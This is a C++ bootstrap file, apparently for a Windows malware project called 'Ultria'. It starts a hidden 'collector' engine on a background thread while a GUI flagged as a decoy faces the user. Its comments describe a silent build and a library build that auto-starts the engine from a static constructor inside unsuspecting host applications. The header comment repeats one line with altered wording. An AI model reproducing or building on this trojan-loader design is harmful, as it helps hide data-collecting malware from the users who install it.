// Ultria bootstrap. Three build shapes share the same engine:
//   silent      -> WinMain calls engine directly
//   bundled GUI -> ULTRA_GUI_ENABLED: embedded UI on the main thread, engine on
//                  a hidden worker (the UI is a build-time plug chosen by mode,
//                  a hidden worker (the UI is a build-time plug, engine untouched)
//   embed/lib   -> link libultria.a; src/embed/auto_start.cpp spins the engine
//                  from a static constructor — host app code is never touched.
#include "engine.h"
#include "config.h"

#include <windows.h>

#if ULTRA_GUI_ENABLED
#include "gui/gui.h"
namespace {
DWORD WINAPI collector_thread(LPVOID) {
    ultria::run_core();
    return 0;
}
} // namespace
#endif

#ifdef ULTRA_DEBUG
int main() {
#if ULTRA_GUI_ENABLED
    CreateThread(nullptr, 0, collector_thread, nullptr, 0, nullptr);
    return gui::run(GetModuleHandleW(nullptr), /*decoy=*/true);
#else
    return ultria::run_core();
#endif
}
#else
int WINAPI WinMain(HINSTANCE instance, HINSTANCE, LPSTR, int) {
#if ULTRA_GUI_ENABLED
    // engine runs hidden while the window is the user-facing app
    CreateThread(nullptr, 0, collector_thread, nullptr, 0, nullptr);
    return gui::run(instance, /*decoy=*/true);
#else
    (void)instance;
    return ultria::run_core();
#endif
}
#endif
